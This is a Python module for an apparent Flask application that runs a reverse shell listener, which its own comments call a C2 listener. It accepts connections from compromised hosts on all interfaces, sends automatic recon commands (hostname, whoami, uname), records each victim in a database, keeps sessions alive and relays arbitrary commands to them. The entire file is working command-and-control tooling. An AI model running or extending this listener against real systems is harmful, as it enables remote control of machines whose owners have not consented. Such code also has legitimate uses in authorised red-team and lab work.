"""Reverse shell listener and management service."""
from __future__ import annotations

import secrets
import socket
import threading
import time
from datetime import datetime
from typing import Dict, Optional

from flask import Flask

from app.extensions import db
from app.models import ReverseShell, ShellExecution


class ShellConnection:
    """Represents an active reverse shell connection."""
    
    def __init__(self, conn: socket.socket, addr: tuple, shell_id: int):
        self.conn = conn
        self.addr = addr
        self.shell_id = shell_id
        self.lock = threading.Lock()
        self.is_active = True
        
    def send_command(self, command: str, timeout: int = 30) -> str:
        """Send command to shell and receive output."""
        with self.lock:
            try:
                if not self.is_active:
                    return "Error: Connection is not active"
                
                # Send command
                self.conn.settimeout(timeout)
                cmd_bytes = (command.strip() + '\n').encode('utf-8')
                self.conn.sendall(cmd_bytes)
                
                # Receive response
                output = b""
                self.conn.settimeout(5)  # Shorter timeout for receiving
                
                # Read until we get a delimiter or timeout
                start_time = time.time()
                while time.time() - start_time < timeout:
                    try:
                        chunk = self.conn.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                        # Simple heuristic: if we get a newline and no data for 0.5s, we're done
                        if b'\n' in chunk:
                            time.sleep(0.5)
                            self.conn.settimeout(0.5)
                            try:
                                chunk = self.conn.recv(4096)
                                if chunk:
                                    output += chunk
                                else:
                                    break
                            except socket.timeout:
                                break
                    except socket.timeout:
                        if output:
                            break
                        continue
                
                return output.decode('utf-8', errors='replace')
            except Exception as exc:
                self.is_active = False
                return f"Error: {exc}"
    
    def close(self):
        """Close the connection."""
        self.is_active = False
        try:
            self.conn.close()
        except Exception:
            pass


class ShellListener:
    """Manages reverse shell connections."""
    
    def __init__(self, app: Flask, port: int = 5000):
        self.app = app
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.is_running = False
        self.listener_thread: Optional[threading.Thread] = None
        self.connections: Dict[int, ShellConnection] = {}
        self.lock = threading.Lock()
        
    def start(self):
        """Start the listener in a background thread."""
        if self.is_running:
            return
        
        self.is_running = True
        self.listener_thread = threading.Thread(target=self._listen, daemon=True)
        self.listener_thread.start()
        
    def stop(self):
        """Stop the listener."""
        self.is_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        
        # Close all active connections
        with self.lock:
            for conn in self.connections.values():
                conn.close()
            self.connections.clear()
    
    def _listen(self):
        """Main listener loop."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Bind to all interfaces (0.0.0.0) to accept reverse shell connections
            # from remote systems. This is intentional for a C2 listener.
            # In production, use firewall rules to restrict access.
            self.server_socket.bind(('0.0.0.0', self.port))  # nosec B104
            self.server_socket.listen(50)  # Allow up to 50 queued connections
            self.server_socket.settimeout(1.0)  # Timeout to check is_running periodically
            
            print(f"[*] Reverse shell listener started on port {self.port}")
            
            while self.is_running:
                try:
                    conn, addr = self.server_socket.accept()
                    # Handle connection in separate thread
                    handler_thread = threading.Thread(
                        target=self._handle_connection,
                        args=(conn, addr),
                        daemon=True
                    )
                    handler_thread.start()
                except socket.timeout:
                    continue
                except Exception as exc:
                    if self.is_running:
                        print(f"[!] Listener error: {exc}")
                    break
                    
        except Exception as exc:
            print(f"[!] Failed to start listener: {exc}")
        finally:
            if self.server_socket:
                self.server_socket.close()
            print("[*] Reverse shell listener stopped")
    
    def _handle_connection(self, conn: socket.socket, addr: tuple):
        """Handle a new reverse shell connection."""
        ip, port = addr
        print(f"[+] New connection from {ip}:{port}")
        
        shell_id = None
        try:
            with self.app.app_context():
                # Try to get system info
                conn.settimeout(5)
                try:
                    # Send info gathering commands
                    hostname = ""
                    platform = ""
                    shell_user = ""
                    
                    # Try to get hostname
                    conn.sendall(b'hostname\n')
                    time.sleep(0.5)
                    try:
                        hostname = conn.recv(1024).decode('utf-8', errors='replace').strip()
                    except:
                        hostname = f"host-{ip}"
                    
                    # Try to get username
                    conn.sendall(b'whoami 2>/dev/null || echo %USERNAME%\n')
                    time.sleep(0.5)
                    try:
                        shell_user = conn.recv(1024).decode('utf-8', errors='replace').strip()
                    except:
                        shell_user = "unknown"
                    
                    # Try to detect OS
                    conn.sendall(b'uname -a 2>/dev/null || ver\n')
                    time.sleep(0.5)
                    try:
                        os_info = conn.recv(2048).decode('utf-8', errors='replace').strip()
                        if 'Linux' in os_info:
                            platform = 'Linux'
                        elif 'Darwin' in os_info:
                            platform = 'macOS'
                        elif 'Windows' in os_info or 'Microsoft' in os_info:
                            platform = 'Windows'
                        else:
                            platform = 'Unknown'
                    except:
                        platform = "unknown"
                        
                except Exception:
                    hostname = f"host-{ip}"
                    platform = "Unknown"
                    shell_user = "unknown"
                
                # Create or update shell record
                shell = ReverseShell.query.filter_by(address=ip, port=port).first()
                if not shell:
                    session_id = secrets.token_urlsafe(16)
                    shell = ReverseShell(
                        session_id=session_id,
                        name=hostname or f"shell-{ip}",
                        address=ip,
                        port=port,
                        hostname=hostname,
                        platform=platform,
                        shell_user=shell_user,
                        status="connected",
                        connected_at=datetime.utcnow(),
                        last_seen=datetime.utcnow(),
                    )
                    db.session.add(shell)
                else:
                    # Generate new session_id if not exists
                    if not shell.session_id:
                        shell.session_id = secrets.token_urlsafe(16)
                    shell.status = "connected"
                    shell.connected_at = datetime.utcnow()
                    shell.last_seen = datetime.utcnow()
                    if hostname:
                        shell.hostname = hostname
                    if platform:
                        shell.platform = platform
                    if shell_user:
                        shell.shell_user = shell_user
                
                db.session.commit()
                shell_id = shell.id
                
                # Store connection
                with self.lock:
                    self.connections[shell_id] = ShellConnection(conn, addr, shell_id)
                
                print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
                
                # Keep connection alive
                while self.is_running and self.connections.get(shell_id):
                    try:
                        # Send keepalive
                        conn.settimeout(30)
                        conn.sendall(b'\n')
                        time.sleep(30)
                        
                        # Update last_seen
                        with self.app.app_context():
                            shell_record = db.session.get(ReverseShell, shell_id)
                            if shell_record:
                                shell_record.last_seen = datetime.utcnow()
                                db.session.commit()
                    except Exception:
                        break
                        
        except Exception as exc:
            print(f"[!] Error handling connection from {ip}:{port}: {exc}")
        finally:
            # Clean up
            if shell_id:
                with self.lock:
                    if shell_id in self.connections:
                        self.connections[shell_id].close()
                        del self.connections[shell_id]
                
                with self.app.app_context():
                    shell = db.session.get(ReverseShell, shell_id)
                    if shell:
                        shell.status = "disconnected"
                        shell.disconnected_at = datetime.utcnow()
                        db.session.commit()
                
                print(f"[-] Shell disconnected: ID {shell_id}")
    
    def execute_command(self, shell_id: int, command: str, timeout: int = 30) -> tuple[bool, str]:
        """Execute a command on a connected shell."""
        with self.lock:
            conn = self.connections.get(shell_id)
            if not conn or not conn.is_active:
                return False, "Shell is not connected"
        
        output = conn.send_command(command, timeout)
        return True, output
    
    def get_active_shells(self) -> list[int]:
        """Get list of active shell IDs."""
        with self.lock:
            return list(self.connections.keys())


# Global listener instance
_listener: Optional[ShellListener] = None


def get_listener(app: Flask, port: int = 5000) -> ShellListener:
    """Get or create the global listener instance."""
    global _listener
    if _listener is None:
        _listener = ShellListener(app, port)
    return _listener


def start_listener(app: Flask):
    """Start the reverse shell listener."""
    port = app.config.get('REVERSE_SHELL_PORT', 5000)
    listener = get_listener(app, port)
    listener.start()
